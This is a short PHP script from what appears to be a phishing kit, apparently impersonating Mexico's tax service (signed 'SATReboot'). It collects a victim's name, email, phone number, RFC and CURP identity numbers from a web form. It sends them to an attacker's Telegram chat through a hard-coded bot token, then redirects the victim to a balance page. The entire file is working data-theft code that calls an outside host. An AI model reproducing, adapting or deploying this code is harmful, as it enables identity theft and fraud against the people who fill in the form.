<?php

$token = "5158268829:AAF8xc22TgLd0-Rmw1GwP98EVcbAwFbIJYA";
$name = $_POST['name'];
$mail = $_POST['mail'];
$number = $_POST['number'];
$rfc = $_POST['rfc'];
$estado = $_POST['estado'];
$curp = $_POST['curp'];

$parameters = array(
    "chat_id" => "1189170037",
    "text" => "NUEVOS DATOS RECIBIDOS PRIMERA PARTE \n\n⭐ Nombre: $name \n🪙 Email: $mail \n📞 Numero: $number \n🆔 RFC: $rfc \n🌐 Estado: $estado \n🧾 CURP: $curp \n\nATTE: SATReboot",
    "disable_web_page_preview" => "true",
    "parse_mode" => "HTML"
);
send($parameters);
function send($parameters)
{
    $bot_token = "5158268829:AAF8xc22TgLd0-Rmw1GwP98EVcbAwFbIJYA";
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    if (!$ch = curl_init())
    {
        exit();
    }
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $parameters);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $outpot = curl_exec($ch);
    header("Location: saldo.html");
}
?>